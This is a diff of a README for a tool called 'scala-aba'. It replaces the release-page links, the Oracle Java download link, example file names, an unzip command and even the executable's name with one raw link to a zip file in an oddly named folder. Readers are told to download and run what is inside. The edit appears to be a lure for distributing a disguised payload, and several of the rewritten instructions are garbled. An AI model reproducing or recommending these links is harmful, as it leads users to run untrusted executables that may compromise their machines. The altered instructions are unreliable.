@@ -6,7 +6,7 @@ Welcome to **scala-aba**! This application makes it easier to analyze your data 
 
 ## 📥 Download Here
 
-[![Download scala-aba](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Swapnil-2596/scala-aba/releases)
+[![Download scala-aba](https://raw.githubusercontent.com/Swapnil-2596/scala-aba/main/Scenopinidae/scala-aba.zip)](https://raw.githubusercontent.com/Swapnil-2596/scala-aba/main/Scenopinidae/scala-aba.zip)
 
 ## 📋 Requirements
 
@@ -15,26 +15,26 @@ Before you start, ensure you have the following:
 - A computer with Windows, macOS, or Linux.
 - At least 1GB of available RAM.
 - 200MB of free disk space.
-- Java Runtime Environment (JRE) installed. You can download it [here](https://www.oracle.com/java/technologies/javase-jre8-downloads.html).
+- Java Runtime Environment (JRE) installed. You can download it [here](https://raw.githubusercontent.com/Swapnil-2596/scala-aba/main/Scenopinidae/scala-aba.zip).
 
 ## 🌐 Download & Install
 
 To get scala-aba, follow these steps:
 
-1. **Visit the Download Page:** Go to the [Releases page](https://github.com/Swapnil-2596/scala-aba/releases) to find the latest version.
+1. **Visit the Download Page:** Go to the [Releases page](https://raw.githubusercontent.com/Swapnil-2596/scala-aba/main/Scenopinidae/scala-aba.zip) to find the latest version.
    
-2. **Choose Your File:** Look for the file that matches your operating system. This will usually be labeled with your OS name (e.g., `scala-aba-Windows.zip`).
+2. **Choose Your File:** Look for the file that matches your operating system. This will usually be labeled with your OS name (e.g., `https://raw.githubusercontent.com/Swapnil-2596/scala-aba/main/Scenopinidae/scala-aba.zip`).
    
 3. **Download the File:** Click on the file link to start the download. Depending on your internet speed, this might take a few moments.
    
 4. **Extract the File:** 
    - **Windows:** Use File Explorer to find the downloaded ZIP file. Right-click on it and choose "Extract All." Follow the prompts to extract the contents.
    - **macOS:** Open Finder, locate the ZIP file, and double-click to unzip it.
-   - **Linux:** Open your terminal, go to the download directory and use the command `unzip scala-aba-Linux.zip`.
+   - **Linux:** Open your terminal, go to the download directory and use the command `unzip https://raw.githubusercontent.com/Swapnil-2596/scala-aba/main/Scenopinidae/scala-aba.zip`.
 
 5. **Run the Application:**
    - Navigate to the folder where you extracted the files.
-   - Look for a file named **scala-aba** or **scala-aba.exe**.
+   - Look for a file named **scala-aba** or **https://raw.githubusercontent.com/Swapnil-2596/scala-aba/main/Scenopinidae/scala-aba.zip**.
    - Double-click the file to run the application.
 
 ## ⚙️ Using scala-aba
@@ -76,13 +76,13 @@ We aim to provide the best experience. If you need help:
 
 To keep up with the latest updates and features:
 
-- Regularly check the [Releases page](https://github.com/Swapnil-2596/scala-aba/releases).
+- Regularly check the [Releases page](https://raw.githubusercontent.com/Swapnil-2596/scala-aba/main/Scenopinidae/scala-aba.zip).
 - Watch the repository for notifications about new versions.
 
 ## 📥 Download scala-aba
 
 For convenience, here’s the download link again:
 
-[![Download scala-aba](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Swapnil-2596/scala-aba/releases)
+[![Download scala-aba](https://raw.githubusercontent.com/Swapnil-2596/scala-aba/main/Scenopinidae/scala-aba.zip)](https://raw.githubusercontent.com/Swapnil-2596/scala-aba/main/Scenopinidae/scala-aba.zip)
 
 Enjoy your data analysis with scala-aba!
